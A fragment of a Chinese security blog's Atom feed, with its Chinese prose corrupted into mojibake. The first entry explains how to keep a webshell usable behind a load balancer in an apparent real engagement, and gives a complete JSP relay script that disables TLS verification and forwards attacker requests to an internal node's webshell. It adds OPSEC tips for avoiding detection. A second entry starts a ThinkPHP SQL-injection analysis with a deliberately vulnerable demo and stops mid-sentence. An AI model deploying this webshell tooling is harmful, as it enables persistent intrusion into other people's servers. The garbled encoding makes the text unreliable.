ä¸ºè¯·æ±‚åˆ°mitmproxyçš„æ—¶å€™ï¼Œ404çš„è¯·æ±‚ä¼šå¾ªç¯è¯·æ±‚ï¼Œç›´åˆ°å“åº”ä¸º200æ—¶ï¼Œå“åº”æ•°æ®æ‰ä¼šè½¬å‘ç»™webshellå®¢æˆ·ç«¯ï¼Œè¿æ°”ä¸å¥½çš„è¯ï¼Œè¿™ä¸ªè¿‡ç¨‹å¯èƒ½ä¼šæŒç»­å¾ˆé•¿æ—¶é—´ï¼Œæ‰€ä»¥éœ€è¦è®¾ç½®webshellå·¥å…·çš„è¶…æ—¶æ—¶é—´ï¼Œç›´åˆ°å¯ä»¥æ­£å¸¸æ¥æ”¶æ•°æ®å’Œå“åº”å±•ç¤ºã€‚</li><li>å¯ä»¥ç•™æ„æˆ‘ä¸Šé¢çš„è„šæœ¬ï¼Œæœ‰ä¸€ä¸ªhttpè½¬httpsçš„ æ“ä½œï¼Œè¿™ä¸ªæ˜¯å› ä¸ºmitmproxyé…ç½®httpsæˆªå–æ•°æ®éå¸¸éº»çƒ¦ï¼Œæ‰€ä»¥å°±æƒ³äº†è¿™ç§æ–¹å¼ï¼Œæˆ‘å½“æ—¶ç›®æ ‡çš„ç¯å¢ƒå°±æ˜¯httpsï¼Œä¹‹ååœ¨webshellè¿æ¥å·¥å…·çš„urléƒ¨åˆ†å¡«httpå³å¯ï¼Œè¯·æ±‚çš„å¤„ç†éƒ¨åˆ†éƒ½åœ¨ä¸Šé¢çš„pyè„šæœ¬é‡Œï¼Œè¿™é‡Œçš„webshellå®¢æˆ·ç«¯å°±å……å½“æ„é€ åŸå§‹è¯·æ±‚å’Œè§£ç å“åº”æ•°æ®å±•ç¤ºçš„åŠŸèƒ½</li></ol><h1 id="0x03-åšäº†æ–‡ä»¶åŒæ­¥çš„è´Ÿè½½å‡è¡¡"><a class="markdownIt-Anchor" href="#0x03-åšäº†æ–‡ä»¶åŒæ­¥çš„è´Ÿè½½å‡è¡¡"></a> 0x03 åšäº†æ–‡ä»¶åŒæ­¥çš„è´Ÿè½½å‡è¡¡</h1><p>ä¸ä¸Šé¢çš„ç›¸å¯¹åº”ï¼Œæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¼šåŒæ­¥åˆ°æ‰€æœ‰çš„è´Ÿè½½nodeèŠ‚ç‚¹</p><h2 id="å¢åŠ httpæµé‡è½¬å‘è„šæœ¬ç»Ÿä¸€è½¬å‘å†…ç½‘å•ä¸€node"><a class="markdownIt-Anchor" href="#å¢åŠ httpæµé‡è½¬å‘è„šæœ¬ç»Ÿä¸€è½¬å‘å†…ç½‘å•ä¸€node"></a> å¢åŠ HTTPæµé‡è½¬å‘è„šæœ¬ï¼Œç»Ÿä¸€è½¬å‘å†…ç½‘å•ä¸€node</h2><p>è¿™æ˜¯èšå‰‘ä½œè€…mediceançš„æ€è·¯</p><p>éœ€è¦è½åœ°ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯webshellï¼Œä¸€ä¸ªæ˜¯æµé‡è½¬å‘è„šæœ¬</p><p>ç›´æ¥åšé˜…è¯»ç†è§£ï¼š</p><p>å•çº¯çš„httpæµé‡è½¬å‘è„šæœ¬</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"javax.net.ssl.*"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.ByteArrayOutputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.DataInputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.InputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.OutputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.net.HttpURLConnection"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.net.URL"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.KeyManagementException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.NoSuchAlgorithmException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.cert.CertificateException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.cert.X509Certificate"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ignoreSsl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HostnameVerifier</span> hv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HostnameVerifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">verify</span><span class="token punctuation">(</span><span class="token class-name">String</span> urlHostName<span class="token punctuation">,</span> <span class="token class-name">SSLSession</span> session<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">trustAllHttpsCertificates</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HttpsURLConnection</span><span class="token punctuation">.</span><span class="token function">setDefaultHostnameVerifier</span><span class="token punctuation">(</span>hv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">trustAllHttpsCertificates</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TrustManager</span><span class="token punctuation">[</span><span class="token punctuation">]</span> trustAllCerts <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TrustManager</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token keyword">new</span> <span class="token class-name">X509TrustManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">public</span> <span class="token class-name">X509Certificate</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getAcceptedIssuers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">checkClientTrusted</span><span class="token punctuation">(</span><span class="token class-name">X509Certificate</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arg0<span class="token punctuation">,</span> <span class="token class-name">String</span> arg1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CertificateException</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// Not implemented</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">checkServerTrusted</span><span class="token punctuation">(</span><span class="token class-name">X509Certificate</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arg0<span class="token punctuation">,</span> <span class="token class-name">String</span> arg1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CertificateException</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// Not implemented</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">SSLContext</span> sc <span class="token operator">=</span> <span class="token class-name">SSLContext</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"TLS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sc<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> trustAllCerts<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>SecureRandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">HttpsURLConnection</span><span class="token punctuation">.</span><span class="token function">setDefaultSSLSocketFactory</span><span class="token punctuation">(</span>sc<span class="token punctuation">.</span><span class="token function">getSocketFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">KeyManagementException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchAlgorithmException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>        <span class="token class-name">String</span> target <span class="token operator">=</span> <span class="token string">"http://172.24.0.2:8080/ant.jsp"</span><span class="token punctuation">;</span><span class="token comment">//å¡«å†™å†…ç½‘nodeçš„webshellåœ°å€</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"https"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">getProtocol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">ignoreSsl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">HttpURLConnection</span> conn <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpURLConnection</span><span class="token punctuation">)</span>url<span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setRequestMethod</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setConnectTimeout</span><span class="token punctuation">(</span><span class="token number">30000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setDoOutput</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setDoInput</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setInstanceFollowRedirects</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> baos<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">OutputStream</span> out2 <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DataInputStream</span> in<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            baos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        baos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        baos<span class="token punctuation">.</span><span class="token function">writeTo</span><span class="token punctuation">(</span>out2<span class="token punctuation">)</span><span class="token punctuation">;</span>        baos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">OutputStream</span> out3<span class="token operator">=</span>response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len2 <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            out3<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        out3<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out3<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240722154209730.png" alt="image-20240722154209730" /></p><p>è¿‡ç¨‹å¦‚å›¾ï¼šå®é™…ä¸Šå°±æ˜¯webshellå…ˆè¯·æ±‚è½¬å‘çš„antproxy.jspï¼Œæ— è®ºè¿™ä¸ªè„šæœ¬åœ¨å“ªä¸ªnodeï¼Œéƒ½ä¼šæŠŠè¯·æ±‚åŒ…ç»Ÿä¸€è½¬å‘åˆ°æŒ‡å®šçš„å†…ç½‘ipåœ°å€çš„nodeï¼Œä¹Ÿå°±ä¿è¯äº†æˆ‘ä»¬çš„è¯·æ±‚éƒ½è½åœ¨äº†ä¸€ä¸ªnodeä¸Šã€‚</p><h3 id="å…¶ä»–è¯­è¨€çš„è½¬å‘è„šæœ¬"><a class="markdownIt-Anchor" href="#å…¶ä»–è¯­è¨€çš„è½¬å‘è„šæœ¬"></a> å…¶ä»–è¯­è¨€çš„è½¬å‘è„šæœ¬</h3><p>å…¶ä»–è¯­è¨€è´Ÿè½½å¾ˆå°‘è§ï¼Œç›´æ¥è®©GPTåšå§</p><h3 id="å¿…é¡»è¦ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶å—"><a class="markdownIt-Anchor" href="#å¿…é¡»è¦ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶å—"></a> å¿…é¡»è¦ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶å—ï¼Ÿ</h3><p>å¯èƒ½æœ‰äººè§‰å¾—ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶æ“ä½œä¸å¤Ÿå®Œç¾ï¼Œä½†æ˜¯æ— è®ºå¦‚ä½•ï¼Œè´Ÿè½½å‡è¡¡çš„æƒ…å†µéƒ½æ˜¯ä¸€å®šè¦è‡³å°‘ä¸Šä¼ ä¸¤æ¬¡çš„ã€‚</p><p>å› ä¸ºæˆ‘ä»¬é¦–å…ˆè¦ä¸Šä¼ è„šæœ¬ï¼Œæ¥åˆ¤æ–­ä¸åŒnodeçš„å·®å¼‚æ€§ï¼Œè¿™ä¸ªå·®å¼‚æœ‰å¯èƒ½æ˜¯ipï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æ–‡ä»¶ã€‚</p><p>ç¬¬äºŒä¸ªä¸Šä¼ çš„è„šæœ¬æ‰æ˜¯æ ¹æ®å·®å¼‚æ€§æ¥ä¿è¯æ‰€æœ‰è¯·æ±‚éƒ½åˆ°æŸä¸€ä¸ªnodeã€‚</p><h1 id="0x04-opsecä¸‹çš„æ€è·¯"><a class="markdownIt-Anchor" href="#0x04-opsecä¸‹çš„æ€è·¯"></a> 0x04 OPSecä¸‹çš„æ€è·¯</h1><p>éµå¾ªOPSecï¼Œæˆ‘ä»¬å°½é‡ä¸ä½¿ç”¨webshellç›´æ¥æ‰§è¡Œå‘½ä»¤è·å–ipå’Œç«¯å£ä¿¡æ¯ï¼Œå¦‚æœæ˜¯Linuxçš„æƒ…å†µè¿˜å¥½è¯´ï¼Œprocä¸‹é¢ä¿å­˜ç€è¿›ç¨‹çš„ç«¯å£ä¿¡æ¯ï¼Œnetä¸‹é¢ä¹Ÿä¿å­˜ç€ç«¯å£ä¿¡æ¯ã€‚édhcpæƒ…å†µä¸‹ä¹Ÿèƒ½ä»æœ¬åœ°configè¯»ipä¿¡æ¯ï¼Œè¯»ä¸åˆ°ipæˆ–è€…æ˜¯windowså°±æ¯”è¾ƒéº»çƒ¦äº†ã€‚</p><p>æ— æ³•è·å–nodeçš„ipä¿¡æ¯ï¼Œå°±åªèƒ½å¯»æ‰¾å…¶ä»–å·®å¼‚æ€§äº†ï¼š</p><ol><li>å¯ä»¥é€šè¿‡ä¸Šä¼ çš„webshellåˆ·æ–°æŸä¸€ç›®å½•ï¼ŒæŸ¥çœ‹æ–‡ä»¶æ˜¯å¦ä¸åŒæ¥å¯»æ‰¾å·®å¼‚æ€§</li><li>é€šè¿‡webshellåœ¨æŸä¸€nodeæ–°å»ºä¸´æ—¶æ–‡ä»¶æ¥æ‰‹åŠ¨åˆ›é€ å·®å¼‚æ€§</li></ol><p>æ¥ä¸‹æ¥å°±å¯ä»¥ç»“åˆä¸Šé¢çš„æœªåšæ–‡ä»¶åŒæ­¥çš„æ€è·¯äº†ï¼š</p><p>ç¡®å®šå·®å¼‚æ€§åï¼Œé‡æ–°ä¸Šä¼ ä¸€ä¸ªwebshllï¼Œå…¶ä¸­å¢åŠ ä¸€ä¸ªåˆ¤æ–­é€»è¾‘ï¼Œåˆ¤æ–­æ¡ä»¶å°±æ˜¯æˆ‘ä»¬ä¸Šé¢æåˆ°çš„å·®å¼‚æ€§ï¼Œæ‹¿ä¸Šé¢æåˆ°çš„ç¬¬2ç‚¹æ‰‹åŠ¨åˆ›é€ å·®å¼‚æ€§æ¥è¯´ï¼š</p><p>if(æ“ä½œç³»ç»Ÿä¸å­˜åœ¨è¯¥ä¸´æ—¶æ–‡ä»¶){è¿”å›404}</p><p>å†ç»“åˆä¸Šé¢0x02çš„å¾ªç¯åˆ¤æ–­çŠ¶æ€ç çš„æ–¹å¼ï¼Œä¹Ÿèƒ½åœ¨ä¸æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‰æä¸‹å®Œæˆè´Ÿè½½webshellçš„è¿æ¥ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p>ï¼ˆè´Ÿè½½å‡è¡¡ä¸‹çš„ WebShell è¿æ¥ï¼‰<a href="https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA">https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-åº&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-åº&quot;&gt;&lt;/a&gt; 0x00 åº&lt;/h1&gt;
&lt;p&gt;æœ€è¿‘æ‰“é‡‘èé¡¹ç›®çš„æ—¶å€™ï¼Œwebshellé‡è§äº†è´Ÿè½½å‡è¡¡ï¼Œè‡ªå·±ä¹‹å‰å…¶å®çœ‹è¿‡ç›¸å…³æ–‡ç« ï¼Œä½†æ˜¯å®æˆ˜æ“ä½œèµ·æ¥è¿˜æ˜¯é‡è§äº†ä¸å°‘å‘ç‚¹çš„ï¼Œæ¥</summary>
      
    
    
    
    
    <category term="è´Ÿè½½å‡è¡¡" scheme="https://cyxsec.github.io/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHPéé»˜è®¤æ¼æ´åˆ†æ</title>
    <link href="https://cyxsec.github.io/2023/07/ThinkPHP%E9%9D%9E%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://cyxsec.github.io/2023/07/ThinkPHP%E9%9D%9E%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-07-16T08:13:14.000Z</published>
    <updated>2024-09-14T08:36:11.634Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-åº"><a class="markdownIt-Anchor" href="#0x00-åº"></a> 0x00 åº</h1><p>ä¸Šé¢æˆ‘ä»¬åˆ†æäº†TPæ¡†æ¶å­˜åœ¨çš„é»˜è®¤æ¼æ´ï¼Œæ­¤ç¯‡åˆ†æä¸€ä¸‹éé»˜è®¤ç¯å¢ƒä¸‹çš„æ¼æ´ï¼Œå¯èƒ½ä¸»è¦åŒ…æ‹¬ï¼š</p><ol><li>æŸäº›å†…ç½®å‡½æ•°æœ¬èº«å­˜åœ¨é—®é¢˜ï¼Œåœ¨ä»£ç å®¡è®¡æ—¶å¯ç»“åˆåˆ©ç”¨</li><li>æ¡†æ¶éé»˜è®¤æƒ…å†µä¸‹çš„æ¼æ´ï¼Œå®æˆ˜æ›´å¤šå¯èƒ½åšæƒé™ç»´æŒ</li></ol><h1 id="0x01-tp3"><a class="markdownIt-Anchor" href="#0x01-tp3"></a> 0x01 TP3</h1><h2 id="ä¸€-sql-æ³¨å…¥"><a class="markdownIt-Anchor" href="#ä¸€-sql-æ³¨å…¥"></a> ä¸€ã€ SQL æ³¨å…¥</h2><h3 id="10-tpè¿‡æ»¤ç­–ç•¥"><a class="markdownIt-Anchor" href="#10-tpè¿‡æ»¤ç­–ç•¥"></a> 1.0 TPè¿‡æ»¤ç­–ç•¥</h3><p>I æ–¹æ³•åœ¨TP3ä¸­æ˜¯è·å–å‚æ•°çš„ï¼Œé»˜è®¤ä¼šå­˜åœ¨è¿‡æ»¤è§„åˆ™</p><ol><li>callbackè°ƒç”¨defalt_filter</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816173930602.png" alt="image-20240816173930602" /></p><p>å®ä½“ç¼–ç ï¼Œé˜²xss</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816174206494.png" alt="image-20240816174206494" /></p><ol start="2"><li>callbackè°ƒç”¨think_fiter</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816174457328.png" alt="image-20240816174457328" /></p><p>SQLæ³¨å…¥è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816174544180.png" alt="image-20240816174544180" /></p><ol start="3"><li>SQLæ“ä½œç±»ï¼Œå®šä¹‰äº†è¿‡æ»¤å‡½æ•°ï¼Œç‰¹æ®Šå­—ç¬¦å¢åŠ è½¬ä¹‰ã€‚ï¼ˆTPé»˜è®¤ä½¿ç”¨éGBKï¼Œå› æ­¤ä¹Ÿé¿å…äº†å­—ç¬¦å‹æ³¨å…¥çš„æ‹¼æ¥é—®é¢˜ï¼‰</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902161421793.png" alt="image-20240902161421793" /></p><h3 id="11-findæ–¹æ³•whereæ³¨å…¥ï¸24"><a class="markdownIt-Anchor" href="#11-findæ–¹æ³•whereæ³¨å…¥ï¸24"></a> 1.1 findæ–¹æ³•+whereæ³¨å…¥ï¼ˆâ¤ï¸.2.4ï¼‰</h3><h4 id="vuldemo"><a class="markdownIt-Anchor" href="#vuldemo"></a> VulDemo</h4><ul><li>findå‡½æ•°å‚æ•°å¯æ§</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Student'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GET.Sno'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å½±å“ç‰ˆæœ¬"><a class="markdownIt-Anchor" href="#å½±å“ç‰ˆæœ¬"></a> å½±å“ç‰ˆæœ¬</h4><p>version&lt;=3.2.3</p><h4 id="æ¼æ´åˆ†æ"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ"></a> æ¼æ´åˆ†æ</h4><p><strong>ç½‘ä¸Šå¾ˆå¤šåˆ†ææ–‡ç« éƒ½æŠŠè¿™ä¸ªæ´å«åšwhereæ³¨å…¥ï¼Œè¿™æ 